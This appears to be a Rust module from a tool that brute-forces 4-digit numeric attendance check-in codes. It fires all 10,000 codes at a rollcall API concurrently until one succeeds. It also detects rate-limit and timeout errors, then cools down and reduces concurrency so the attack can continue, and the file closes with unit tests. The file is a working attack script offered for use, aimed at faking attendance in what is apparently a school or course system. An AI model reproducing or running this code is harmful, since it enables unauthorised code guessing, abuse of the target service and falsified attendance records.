//! 數字簽到爆力破解模組
//!
//! 透過並發嘗試 0000~9999 所有可能的 4 位數字代碼，找出正確的簽到碼。
//!
//! # 策略
//! - 將 10000 個代碼分批，每批最多同時發出 `concurrency` 個請求（預設 200）
//! - 任何一個 batch 中只要找到正確答案，立即取消剩餘請求並返回
//! - 使用 `tokio` 的 semaphore 控制並發量，避免同時開太多 TCP 連線
//!
//! # 注意
//! 過高的並發可能被伺服器 rate-limit 或封鎖，建議保持在 100~300 之間。

use std::sync::Arc;
use std::time::Duration;

use futures::stream::{self, StreamExt};

use tokio::sync::Mutex;
use tokio::time::sleep;
use tracing::{debug, info, instrument, warn};

use crate::api::{is_auth_error, rollcall::AttendanceResult, ApiClient};
use crate::config::BruteForceConfig;

// ─── 爆破結果 ─────────────────────────────────────────────────────────────────

/// 數字爆破的結果
#[derive(Debug, Clone)]
pub enum BruteForceResult {
    /// 找到正確的數字代碼
    Found {
        /// 正確的 4 位數字代碼（字串格式，例如 "0042"）
        code: String,
        /// 嘗試了幾個代碼才找到
        attempts: usize,
    },
    /// 嘗試完 0000~9999 全部代碼都失敗
    NotFound,
    /// 嘗試途中發生致命錯誤（通常是 session 過期）
    Error(String),
}

impl BruteForceResult {
    pub fn is_found(&self) -> bool {
        matches!(self, BruteForceResult::Found { .. })
    }

    pub fn found_code(&self) -> Option<&str> {
        match self {
            BruteForceResult::Found { code, .. } => Some(code),
            _ => None,
        }
    }
}

impl std::fmt::Display for BruteForceResult {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            BruteForceResult::Found { code, attempts } => {
                write!(f, "找到正確代碼：{code}（嘗試了 {attempts} 次）")
            }
            BruteForceResult::NotFound => write!(f, "爆破失敗：0000~9999 全部嘗試完畢，無正確代碼"),
            BruteForceResult::Error(e) => write!(f, "爆破中止：{e}"),
        }
    }
}

// ─── 進度追蹤 ─────────────────────────────────────────────────────────────────

/// 爆破進度資訊（可選，用於日誌或 UI）
#[derive(Debug, Clone, Default)]
pub struct BruteForceProgress {
    /// 已嘗試的代碼數量
    pub attempted: usize,
    /// 總共需要嘗試的代碼數量
    pub total: usize,
    /// 當前進度百分比（0.0 ~ 100.0）
    pub percent: f32,
}

impl BruteForceProgress {
    fn new(attempted: usize, total: usize) -> Self {
        Self {
            attempted,
            total,
            percent: if total == 0 {
                0.0
            } else {
                attempted as f32 / total as f32 * 100.0
            },
        }
    }
}

// ─── 主爆破函式 ───────────────────────────────────────────────────────────────

/// 對指定的 rollcall 執行數字爆破簽到
///
/// # 參數
/// - `api`：已認證的 API 客戶端
/// - `rollcall_id`：要簽到的 rollcall ID
/// - `config`：爆破設定（並發數、延遲等）
///
/// # 返回
/// 返回 `BruteForceResult`，包含是否找到正確代碼及嘗試次數。
#[instrument(skip(api, config), fields(rollcall_id = rollcall_id))]
pub async fn brute_force_number_rollcall(
    api: Arc<ApiClient>,
    rollcall_id: u64,
    config: &BruteForceConfig,
) -> BruteForceResult {
    let concurrency = config.concurrency;
    let delay_ms = config.request_delay_ms;
    let mut current_concurrency = concurrency;
    let mut cooldowns_used = 0usize;
    let mut transient_failures_since_cooldown = 0usize;

    info!(
        rollcall_id = rollcall_id,
        concurrency = concurrency,
        transient_failure_threshold = config.transient_failure_threshold,
        transient_failure_ratio = config.transient_failure_ratio,
        cooldown_secs = config.cooldown_secs,
        max_cooldowns = config.max_cooldowns,
        min_concurrency = config.min_concurrency,
        "開始數字爆破，並發數：{concurrency}"
    );

    // 產生全部 10000 個代碼（0000 ~ 9999）
    let all_codes: Vec<String> = (0u32..10000).map(|n| format!("{n:04}")).collect();
    let total = all_codes.len();

    // 找到答案後用此標誌通知其他任務停止
    let found: Arc<Mutex<Option<(String, usize)>>> = Arc::new(Mutex::new(None));
    // 記錄是否發生致命錯誤
    let fatal_error: Arc<Mutex<Option<String>>> = Arc::new(Mutex::new(None));
    // 已嘗試的計數器
    let attempts: Arc<Mutex<usize>> = Arc::new(Mutex::new(0));

    let mut next_index = 0usize;
    let mut chunk_idx = 0usize;

    'outer: while next_index < total {
        // 在開始新批次前，先確認是否已找到答案或發生錯誤
        {
            let found_guard = found.lock().await;
            let err_guard = fatal_error.lock().await;
            if found_guard.is_some() || err_guard.is_some() {
                break 'outer;
            }
        }

        let chunk_start = next_index;
        let chunk_end = (chunk_start + current_concurrency).min(total);
        let chunk = &all_codes[chunk_start..chunk_end];
        next_index = chunk_end;
        chunk_idx += 1;
        let attempts_before_batch = *attempts.lock().await;
        let batch_transient_failures: Arc<Mutex<usize>> = Arc::new(Mutex::new(0));

        debug!(
            chunk = chunk_idx,
            range_start = chunk_start,
            range_end = chunk_end.saturating_sub(1),
            concurrency = current_concurrency,
            codes = ?&chunk[..chunk.len().min(3)],
            "開始新批次"
        );

        // 為這批次建立所有任務
        let tasks: Vec<_> = chunk
            .iter()
            .map(|code| {
                let api = Arc::clone(&api);
                let found = Arc::clone(&found);
                let fatal_error = Arc::clone(&fatal_error);
                let attempts = Arc::clone(&attempts);
                let batch_transient_failures = Arc::clone(&batch_transient_failures);
                let code = code.clone();

                async move {
                    // 先確認是否已找到答案（避免浪費請求）
                    {
                        let f = found.lock().await;
                        if f.is_some() {
                            return;
                        }
                        let e = fatal_error.lock().await;
                        if e.is_some() {
                            return;
                        }
                    }

                    // 若有延遲設定
                    if delay_ms > 0 {
                        sleep(Duration::from_millis(delay_ms)).await;
                    }

                    // 發送請求
                    let result = api.answer_number_rollcall(rollcall_id, &code).await;

                    // 更新計數
                    let current_attempts = {
                        let mut a = attempts.lock().await;
                        *a += 1;
                        *a
                    };

                    match result {
                        Ok(AttendanceResult::Success) => {
                            info!(code = %code, attempts = current_attempts, "✅ 數字簽到成功！");
                            let mut f = found.lock().await;
                            if f.is_none() {
                                *f = Some((code.clone(), current_attempts));
                            }
                        }
                        Ok(AttendanceResult::Failed { .. }) => {
                            // 代碼錯誤，繼續
                            debug!(code = %code, "代碼錯誤，繼續");
                        }
                        Ok(AttendanceResult::TransientFailure { reason }) => {
                            let mut failures = batch_transient_failures.lock().await;
                            *failures += 1;
                            warn!(code = %code, reason = %reason, "數字簽到遇到暫時性失敗");
                        }
                        Ok(AttendanceResult::RadarTooFar { .. }) => {
                            // 不應在數字簽到收到此回應，記錄警告
                            let mut failures = batch_transient_failures.lock().await;
                            *failures += 1;
                            warn!(code = %code, "收到非預期的 RadarTooFar 回應");
                        }
                        Err(e) => {
                            // 判斷是否為需要重新登錄的致命錯誤
                            let err_str = e.to_string();
                            if is_auth_error(&err_str) {
                                warn!(error = %e, "數字爆破遇到認證錯誤，停止爆破");
                                let mut fe = fatal_error.lock().await;
                                if fe.is_none() {
                                    *fe = Some(err_str);
                                }
                            } else if is_transient_number_error(&err_str) {
                                let mut failures = batch_transient_failures.lock().await;
                                *failures += 1;
                                warn!(code = %code, error = %e, "數字簽到遇到暫時性請求錯誤");
                            } else {
                                // 其他錯誤（網路問題等），記錄但繼續
                                debug!(code = %code, error = %e, "請求失敗，繼續");
                            }
                        }
                    }
                }
            })
            .collect();

        // 並發執行這批次的所有任務
        // 使用 buffer_unordered 保持並發，並等待所有任務完成
        stream::iter(tasks)
            .for_each_concurrent(current_concurrency, |task| task)
            .await;

        // 批次完成後記錄進度
        let current_attempts = *attempts.lock().await;
        let batch_attempts = current_attempts.saturating_sub(attempts_before_batch);
        let batch_transient = *batch_transient_failures.lock().await;
        transient_failures_since_cooldown += batch_transient;
        let progress = BruteForceProgress::new(current_attempts, total);
        debug!(
            chunk = chunk_idx,
            attempted = current_attempts,
            batch_attempts = batch_attempts,
            batch_transient_failures = batch_transient,
            transient_failures_since_cooldown = transient_failures_since_cooldown,
            percent = format!("{:.1}%", progress.percent),
            "批次完成"
        );

        // 每完成一個批次就記錄一次進度日誌
        if chunk_idx % 10 == 0 {
            info!(
                progress = format!("{:.1}%", progress.percent),
                attempted = current_attempts,
                total = total,
                concurrency = current_concurrency,
                "爆破進度"
            );
        }

        if should_trigger_failure_control(
            batch_transient,
            batch_attempts,
            transient_failures_since_cooldown,
            config,
        ) {
            if cooldowns_used >= config.max_cooldowns {
                let reason = format!(
                    "異常失敗超過門檻，停止數字爆破（batch_transient={batch_transient}, \
                     failures_since_cooldown={transient_failures_since_cooldown}, \
                     cooldowns_used={cooldowns_used}）"
                );
                warn!(reason = %reason, "數字爆破中止");
                let mut fe = fatal_error.lock().await;
                if fe.is_none() {
                    *fe = Some(reason);
                }
                break 'outer;
            }

            cooldowns_used += 1;
            let next_concurrency =
                next_cooldown_concurrency(current_concurrency, config.min_concurrency);
            warn!(
                cooldowns_used = cooldowns_used,
                max_cooldowns = config.max_cooldowns,
                cooldown_secs = config.cooldown_secs,
                old_concurrency = current_concurrency,
                new_concurrency = next_concurrency,
                batch_transient_failures = batch_transient,
                transient_failures_since_cooldown = transient_failures_since_cooldown,
                "異常失敗達門檻，冷卻後降低並發"
            );
            sleep(Duration::from_secs(config.cooldown_secs)).await;
            current_concurrency = next_concurrency;
            transient_failures_since_cooldown = 0;
        }
    }

    // ── 彙整結果 ─────────────────────────────────────────────────────────────
    let found_guard = found.lock().await;
    let error_guard = fatal_error.lock().await;
    let final_attempts = *attempts.lock().await;

    if let Some(err) = error_guard.as_ref() {
        warn!(error = %err, "數字爆破因致命錯誤中止");
        BruteForceResult::Error(err.clone())
    } else if let Some((code, attempts_when_found)) = found_guard.as_ref() {
        info!(
            code = %code,
            attempts = attempts_when_found,
            "數字爆破完成，找到正確代碼"
        );
        BruteForceResult::Found {
            code: code.clone(),
            attempts: *attempts_when_found,
        }
    } else {
        warn!(
            total_attempts = final_attempts,
            "數字爆破完成，未找到正確代碼（已嘗試 {final_attempts} 個）"
        );
        BruteForceResult::NotFound
    }
}

fn should_trigger_failure_control(
    batch_transient_failures: usize,
    batch_attempts: usize,
    transient_failures_since_cooldown: usize,
    config: &BruteForceConfig,
) -> bool {
    if batch_transient_failures == 0 {
        return false;
    }

    let batch_ratio_exceeded = batch_attempts > 0
        && (batch_transient_failures as f32 / batch_attempts as f32)
            >= config.transient_failure_ratio;

    batch_ratio_exceeded || transient_failures_since_cooldown >= config.transient_failure_threshold
}

fn next_cooldown_concurrency(current: usize, min_concurrency: usize) -> usize {
    (current / 2).max(min_concurrency)
}

pub(crate) fn is_transient_number_error(err: &str) -> bool {
    let lower = err.to_ascii_lowercase();
    lower.contains("429")
        || lower.contains("too many requests")
        || lower.contains("408")
        || lower.contains("request timeout")
        || lower.contains("timed out")
        || lower.contains("timeout")
        || lower.contains("connect")
        || lower.contains("connection")
        || lower.contains("dns")
        || lower.contains("network")
        || lower.contains("tcp")
        || lower.contains("http 5")
        || lower.contains("status 5")
}

// ─── 代碼生成器 ───────────────────────────────────────────────────────────────

/// 格式化數字代碼為 4 位補零字串
///
/// # 範例
/// ```
/// assert_eq!(format_code(42), "0042");
/// assert_eq!(format_code(0), "0000");
/// assert_eq!(format_code(9999), "9999");
/// ```
pub fn format_code(n: u32) -> String {
    assert!(n <= 9999, "Code must be 0..=9999, got {n}");
    format!("{n:04}")
}

/// 產生指定範圍的代碼迭代器（包含首尾）
///
/// # 參數
/// - `start`：起始代碼（0 ~ 9999）
/// - `end`：結束代碼（含，必須 >= start）
pub fn code_range(start: u32, end: u32) -> impl Iterator<Item = String> {
    assert!(start <= end, "start must be <= end");
    assert!(end <= 9999, "end must be <= 9999");
    (start..=end).map(format_code)
}

/// 產生所有 10000 個代碼
pub fn all_codes() -> impl Iterator<Item = String> {
    (0u32..10000).map(format_code)
}

// ─── 測試 ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_format_code() {
        assert_eq!(format_code(0), "0000");
        assert_eq!(format_code(1), "0001");
        assert_eq!(format_code(42), "0042");
        assert_eq!(format_code(100), "0100");
        assert_eq!(format_code(999), "0999");
        assert_eq!(format_code(1000), "1000");
        assert_eq!(format_code(9999), "9999");
    }

    #[test]
    #[should_panic(expected = "Code must be 0..=9999")]
    fn test_format_code_out_of_range() {
        format_code(10000);
    }

    #[test]
    fn test_code_range() {
        let codes: Vec<String> = code_range(0, 3).collect();
        assert_eq!(codes, vec!["0000", "0001", "0002", "0003"]);
    }

    #[test]
    fn test_code_range_single() {
        let codes: Vec<String> = code_range(42, 42).collect();
        assert_eq!(codes, vec!["0042"]);
    }

    #[test]
    fn test_all_codes_count() {
        let count = all_codes().count();
        assert_eq!(count, 10000);
    }

    #[test]
    fn test_all_codes_first_last() {
        let mut iter = all_codes();
        assert_eq!(iter.next().unwrap(), "0000");
        // 最後一個
        let last = all_codes().last().unwrap();
        assert_eq!(last, "9999");
    }

    #[test]
    fn test_all_codes_unique() {
        use std::collections::HashSet;
        let codes: HashSet<String> = all_codes().collect();
        assert_eq!(codes.len(), 10000, "所有代碼必須唯一");
    }

    #[test]
    fn test_all_codes_format() {
        // 確保每個代碼都是 4 位字串
        for code in all_codes() {
            assert_eq!(code.len(), 4, "代碼 `{code}` 長度不是 4");
            assert!(
                code.chars().all(|c| c.is_ascii_digit()),
                "代碼 `{code}` 含非數字字元"
            );
        }
    }

    #[test]
    fn test_brute_force_result_display() {
        let found = BruteForceResult::Found {
            code: "0042".to_string(),
            attempts: 43,
        };
        let s = found.to_string();
        assert!(s.contains("0042"));
        assert!(s.contains("43"));

        let not_found = BruteForceResult::NotFound;
        assert!(not_found.to_string().contains("9999"));

        let err = BruteForceResult::Error("Session expired".to_string());
        assert!(err.to_string().contains("Session expired"));
    }

    #[test]
    fn test_brute_force_result_is_found() {
        assert!(BruteForceResult::Found {
            code: "0000".into(),
            attempts: 1
        }
        .is_found());
        assert!(!BruteForceResult::NotFound.is_found());
        assert!(!BruteForceResult::Error("err".into()).is_found());
    }

    #[test]
    fn test_brute_force_result_found_code() {
        let r = BruteForceResult::Found {
            code: "1234".into(),
            attempts: 1235,
        };
        assert_eq!(r.found_code(), Some("1234"));
        assert_eq!(BruteForceResult::NotFound.found_code(), None);
    }

    #[test]
    fn test_progress_percent() {
        let p = BruteForceProgress::new(100, 10000);
        assert!((p.percent - 1.0).abs() < 0.01);

        let p = BruteForceProgress::new(5000, 10000);
        assert!((p.percent - 50.0).abs() < 0.01);

        let p = BruteForceProgress::new(10000, 10000);
        assert!((p.percent - 100.0).abs() < 0.01);
    }

    #[test]
    fn test_progress_zero_total() {
        let p = BruteForceProgress::new(0, 0);
        assert_eq!(p.percent, 0.0);
    }

    fn test_config() -> BruteForceConfig {
        BruteForceConfig {
            concurrency: 100,
            request_delay_ms: 0,
            transient_failure_threshold: 50,
            transient_failure_ratio: 0.20,
            cooldown_secs: 10,
            max_cooldowns: 3,
            min_concurrency: 10,
        }
    }

    #[test]
    fn test_transient_number_error_classification() {
        assert!(is_transient_number_error("HTTP 429 Too Many Requests"));
        assert!(is_transient_number_error("HTTP 408 Request Timeout"));
        assert!(is_transient_number_error("HTTP 500 Internal Server Error"));
        assert!(is_transient_number_error("operation timed out"));
        assert!(is_transient_number_error("connection refused"));

        assert!(!is_transient_number_error("code 0042 不正確"));
        assert!(!is_transient_number_error("HTTP 400 Bad Request"));
        assert!(!is_transient_number_error("HTTP 422 Unprocessable Entity"));
        assert!(!is_transient_number_error("Unauthorized"));
    }

    #[test]
    fn test_failure_control_ignores_normal_wrong_code_batches() {
        let cfg = test_config();
        assert!(!should_trigger_failure_control(0, 100, 0, &cfg));
    }

    #[test]
    fn test_failure_control_triggers_on_batch_ratio() {
        let cfg = test_config();
        assert!(should_trigger_failure_control(20, 100, 20, &cfg));
        assert!(!should_trigger_failure_control(19, 100, 19, &cfg));
    }

    #[test]
    fn test_failure_control_triggers_on_threshold() {
        let cfg = test_config();
        assert!(should_trigger_failure_control(1, 100, 50, &cfg));
        assert!(!should_trigger_failure_control(1, 100, 49, &cfg));
    }

    #[test]
    fn test_next_cooldown_concurrency_halves_and_clamps() {
        assert_eq!(next_cooldown_concurrency(100, 10), 50);
        assert_eq!(next_cooldown_concurrency(15, 10), 10);
        assert_eq!(next_cooldown_concurrency(10, 10), 10);
    }

    #[test]
    fn test_chunk_size_covers_all() {
        // 確認 chunk 邏輯不會遺漏任何代碼
        let all: Vec<String> = all_codes().collect();
        let chunk_size = 200_usize;
        let chunks: Vec<&[String]> = all.chunks(chunk_size).collect();

        let mut reconstructed = Vec::new();
        for chunk in chunks {
            reconstructed.extend_from_slice(chunk);
        }

        assert_eq!(reconstructed.len(), 10000);
        assert_eq!(reconstructed[0], "0000");
        assert_eq!(reconstructed[9999], "9999");
    }
}
